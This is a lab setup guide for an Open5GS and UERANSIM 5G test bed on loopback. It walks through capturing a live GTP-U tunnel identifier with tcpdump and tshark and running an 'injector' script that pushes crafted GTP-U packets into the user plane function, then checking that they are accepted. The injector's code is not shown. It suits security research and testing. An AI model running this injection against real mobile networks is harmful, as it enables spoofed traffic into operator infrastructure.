# Open5GS + UERANSIM GTP-U Lab Setup

This guide explains how to run the local Open5GS and UERANSIM lab, capture the correct TEID, and execute `index.py`.

Use this only in a lab you control.

## Files used

- `index.py`
- `ueransim-open5gs-gnb.yaml`
- `ueransim-open5gs-ue.yaml`
- `add_lab_subscriber.js`

## Requirements

- Linux host: Ubuntu, Debian, or Kali
- `sudo` access
- `Open5GS`
- `MongoDB`
- `Python 3`
- `Scapy`
- `tcpdump`
- `tshark` or Wireshark
- `git`
- `make`
- `gcc`
- `g++`
- `cmake`
- `libsctp1`
- `libsctp-dev`

## Install required tools

Example:

```bash
sudo apt update
sudo apt install -y \
  open5gs \
  mongodb \
  python3 \
  python3-pip \
  tcpdump \
  tshark \
  wireshark \
  git \
  make \
  gcc \
  g++ \
  cmake \
  libsctp1 \
  libsctp-dev

pip3 install scapy
```

## Build UERANSIM

```bash
git clone https://github.com/aligungr/UERANSIM.git
cd UERANSIM
make -j"$(nproc)"
```

## Start Open5GS

```bash
sudo systemctl start open5gs-nrfd open5gs-scpd
sudo systemctl start open5gs-amfd open5gs-smfd open5gs-upfd
sudo systemctl start open5gs-ausfd open5gs-udmd open5gs-udrd
sudo systemctl start open5gs-pcfd open5gs-nssfd open5gs-bsfd
```

## Bring up `ogstun`

```bash
sudo ip addr add 10.45.0.1/16 dev ogstun 2>/dev/null || true
sudo ip link set ogstun up mtu 1400
ip addr show ogstun
```

Expected output includes:

```text
inet 10.45.0.1/16
```

## Add the lab subscriber

Run from the project directory:

```bash
mongosh --quiet open5gs add_lab_subscriber.js
```

The subscriber used by this lab is:

- IMSI: `999700000000001`
- Key: `465B5CE8B199B49FAA5F0A2EE238A6BC`
- OPc: `E8ED289DEBA952E4283B54E88E6183CA`

## Start UERANSIM gNB

In terminal 1:

```bash
cd /path/to/UERANSIM
sudo ./build/nr-gnb -c /path/to/project/ueransim-open5gs-gnb.yaml
```

Expected output includes:

```text
NG Setup procedure is successful
```

## Start UERANSIM UE

In terminal 2:

```bash
cd /path/to/UERANSIM
sudo ./build/nr-ue -c /path/to/project/ueransim-open5gs-ue.yaml
```

If it works, the UE should register and create `uesimtun0`.

Check it:

```bash
ip addr show uesimtun0
```

Expected output includes something like:

```text
inet 10.45.0.x/16
```

## Capture the live TEID

Do not guess the TEID. Capture it from real traffic.

In terminal 3, start capture:

```bash
sudo tcpdump -i lo -w /path/to/project/gtpu_capture.pcap udp port 2152
```

In terminal 4, generate UE traffic:

```bash
ping -I uesimtun0 8.8.8.8
```

Stop `tcpdump` with `Ctrl-C`, then extract the TEID:

```bash
tshark -r /path/to/project/gtpu_capture.pcap \
  -Y "gtp" \
  -T fields \
  -e ip.src \
  -e ip.dst \
  -e gtp.teid \
  -e gtp.message
```

The TEID is the third column.

Example output:

```text
127.0.0.1    127.0.0.7    0x00000005    255
127.0.0.7    127.0.0.1    0x00000005    1
```

Here the TEID is `0x00000005`.

## Run the injector

Use:

- `--gnb-ip 127.0.0.1`
- `--upf-ip 127.0.0.7`
- `--teid` from `tshark`
- `--ue-ip` from `uesimtun0`

Example:

```bash
sudo python3 index.py \
  --gnb-ip 127.0.0.1 \
  --upf-ip 127.0.0.7 \
  --teid 0x00000005 \
  --ue-ip 10.45.0.3 \
  --payload icmp
```

Dry run first if needed:

```bash
sudo python3 index.py \
  --gnb-ip 127.0.0.1 \
  --upf-ip 127.0.0.7 \
  --teid 0x00000005 \
  --ue-ip 10.45.0.3 \
  --payload icmp \
  --dry-run
```

## Verify the result

Watch the UPF tunnel interface while injecting:

```bash
sudo tcpdump -i ogstun -n -v
```

If the packet is accepted, you should see the inner decapsulated traffic there.

## Meaning of the important values

- `--gnb-ip`: outer source IP of the GTP-U packet, in this lab `127.0.0.1`
- `--upf-ip`: UPF GTP-U address, in this lab `127.0.0.7`
- `--ue-ip`: UE tunnel IP on `uesimtun0`, for example `10.45.0.3`
- `--teid`: numeric tunnel identifier captured from live GTP traffic

## Common errors

### `PLMN selection failure, no cells in coverage`

Cause:
- `nr-gnb` is not running
- or it crashed

Fix:
- restart the gNB first
- then restart the UE

### `uesimtun0: No such device`

Cause:
- UE did not complete registration
- or UE process exited

Fix:
- confirm `nr-gnb` is still running
- restart `nr-ue`

### `TEID must be an integer`

Cause:
- you passed an IP address instead of a TEID

Wrong:

```bash
--teid 10.45.0.1
```

Correct:

```bash
--teid 1
```

or:

```bash
--teid 0x00000001
```

### `Unhandled GTP-U message type: 26`

Cause:
- the UPF returned an Error Indication to the gNB
- usually because the TEID was wrong or stale

Fix:
- capture a fresh TEID from live traffic
- do not guess it

### `tshark: Some fields aren't valid: gtp.message_type`

Cause:
- this `tshark` version uses `gtp.message`, not `gtp.message_type`

Correct command:

```bash
tshark -r gtpu_capture.pcap -Y "gtp" -T fields -e ip.src -e ip.dst -e gtp.teid -e gtp.message
```

### Empty capture file

If `gtpu_capture.pcap` is very small, for example 24 bytes, no traffic was captured.

Fix:
- keep `tcpdump` running while the UE is generating traffic
- capture on `lo` because this lab uses loopback GTP

## Quick checklist

1. Open5GS running
2. `ogstun` up on `10.45.0.1/16`
3. subscriber added to MongoDB
4. `nr-gnb` running
5. `nr-ue` running
6. `uesimtun0` exists
7. capture real TEID with `tcpdump` and `tshark`
8. run `index.py` with the captured TEID and actual UE IP
